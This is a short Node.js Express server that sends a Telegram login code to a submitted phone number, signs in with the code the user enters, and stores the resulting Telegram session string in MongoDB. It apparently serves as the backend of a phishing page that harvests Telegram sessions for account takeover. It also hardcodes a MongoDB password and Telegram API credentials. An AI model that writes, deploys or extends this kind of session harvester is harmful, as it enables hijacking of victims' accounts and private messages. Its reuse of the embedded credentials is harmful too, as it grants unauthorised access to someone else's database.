const express = require('express');
const cors = require('cors');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const input = require('input'); // Nur falls lokal, auf Render ggf. ignorieren
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(express.json());

// MongoDB Verbindung
const mongoURI = "mongodb+srv://mercyinfo52_db_user:Hinva312!@cluster0.a0bslma.mongodb.net/?retryWrites=true&w=majority";
mongoose.connect(mongoURI);

const SessionSchema = new mongoose.Schema({
    phone: String,
    session: String,
    date: { type: Date, default: Date.now }
});
const SessionModel = mongoose.model('Session', SessionSchema);

const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';
const stringSession = new StringSession(""); 

let client = new TelegramClient(stringSession, apiId, apiHash, { connectionRetries: 5 });

let tempStorage = {};

app.post('/send-otp', async (req, res) => {
    const { phone } = req.body;
    try {
        await client.connect();
        const { phoneCodeHash } = await client.sendCode({ apiId, apiHash }, phone);
        tempStorage[phone] = { phoneCodeHash };
        res.json({ success: true });
    } catch (err) {
        res.status(400).json({ error: err.message });
    }
});

app.post('/verify-otp', async (req, res) => {
    const { phone, code } = req.body;
    try {
        const { phoneCodeHash } = tempStorage[phone];
        const result = await client.signInUser({
            apiId,
            apiHash,
            phoneNumber: phone,
            phoneCodeHash,
            phoneCode: code,
        });
        
        await SessionModel.create({ phone, session: client.session.save() });
        res.json({ success: true });
    } catch (err) {
        res.status(400).json({ error: err.message });
    }
});

app.listen(3000, () => console.log('Server running on port 3000'));
